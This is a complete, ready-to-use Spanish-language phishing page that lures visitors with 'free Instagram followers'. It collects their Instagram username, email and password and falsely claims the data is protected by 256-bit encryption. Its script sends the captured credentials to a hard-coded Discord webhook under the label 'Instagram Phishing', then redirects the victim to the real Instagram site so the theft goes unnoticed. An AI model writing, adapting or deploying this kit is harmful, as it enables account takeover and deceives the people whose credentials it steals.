<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguidores Gratis Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .header {
            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
            padding: 30px;
            text-align: center;
            color: white;
        }
        .header h1 { font-size: 24px; }
        .content { padding: 30px; }
        .badge {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        .badge h2 { color: #833ab4; font-size: 32px; }
        .input-group { margin-bottom: 15px; }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .footer {
            padding: 15px;
            text-align: center;
            font-size: 11px;
            color: #999;
            border-top: 1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>Seguidores Gratis Instagram</h1>
            <p>¡Obtén 10,000+ seguidores al instante!</p>
        </div>
        <div class="content">
            <div class="badge">
                <h2>10,000+</h2>
                <p>¡Seguidores Gratis Disponibles!</p>
            </div>
            
            <!-- EL FORMULARIO -->
            <form id="form">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Usuario de Instagram" required>
                </div>
                <div class="input-group">
                    <input type="email" id="email" placeholder="Correo Electrónico" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Contraseña de Instagram" required>
                </div>
                <button type="submit" class="btn">¡Obtener Seguidores Ahora!</button>
            </form>
        </div>
        <div class="footer">
            <p>🔒 Tus datos están seguros. Encriptación 256-bit.</p>
        </div>
    </div>

    <!-- JAVASCRIPT PARA ENVIAR A DISCORD -->
    <script>
        // REEMPLAZA ESTO CON TU URL DEL WEBHOOK:
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1533165560269902036/1V72wvP0Imrg6WRY605ntoRmVByvPgNYzuniya9UTVLhWHghX6IviPT53aKfiYCw8IcH';
        
        document.getElementById('form').onsubmit = function(e) {
            e.preventDefault(); // Evita que se recargue la página
            
            // Obtiene los valores
            const usuario = document.getElementById('username').value;
            const email = document.getElementById('email').value;
            const contrasena = document.getElementById('password').value;
            const fecha = new Date().toLocaleString();
            
            // Prepara el mensaje para Discord
            const mensaje = {
                content: `🔔 **NUEVA CAPTURA**\n\n👤 **Usuario IG:** ${usuario}\n📧 **Email:** ${email}\n🔑 **Contraseña:** ${contrasena}\n🕐 **Fecha:** ${fecha}\n🌐 **Fuente:** Instagram Phishing`
            };
            
            // Envía a Discord
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(mensaje)
            })
            .then(() => {
                // Redirige a Instagram oficial
                window.location.href = 'https://www.instagram.com';
            })
            .catch(() => {
                // Aunque falle, redirige igual
                window.location.href = 'https://www.instagram.com';
            });
        };
    </script>
</body>
</html>
